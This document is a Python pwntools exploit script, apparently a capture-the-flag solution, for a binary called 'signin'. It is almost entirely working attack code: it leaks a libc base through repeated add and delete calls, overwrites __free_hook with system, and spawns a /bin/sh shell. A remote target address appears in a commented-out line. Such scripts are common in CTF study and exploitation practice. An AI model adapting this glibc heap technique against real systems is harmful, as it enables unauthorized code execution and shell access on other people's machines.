#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

p = process('./signin')
# p = remote('47.242.161.199', 9990)
# gdb.attach(p, 'b *$rebase(0x11CD)\n')
LIBC = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
# LIBC = ELF('libc.so')

def add(idx, num):
  p.sendlineafter('>>', str(1))
  p.sendlineafter('Index:', str(idx))
  p.sendlineafter('Number:', str(num))

def delete(idx):
  p.sendlineafter('>>', str(2))
  p.sendlineafter('Index:', str(idx))

def show(idx):
  p.sendlineafter('>>', str(3))
  p.sendlineafter('Index:', str(idx))

if __name__ == "__main__":
  for i in range(300):
    add(1,1)
    print ('add' + str(i))
  for i in range(557):
    delete(1)
    print ('delete' + str(i))
  show(1)
  libc = int(p.recvline(), 10) - 0x3ebc40 - 96
  success('leak: ' + str(hex(libc)))
  __free_hook = libc + LIBC.sym['__free_hook']
  pause()

  for i in range(9429):
    delete(1)
    print ('delete2' + str(i))
  add(1, __free_hook + 0x8)

  add(2, unpack('/bin/sh\x00', 'all'))
  delete(2)
  delete(2)
  add(2, libc + LIBC.sym['system'])

  add(2, unpack('/bin/sh\x00', 'all'))

  # gdb.attach(p)
  p.interactive()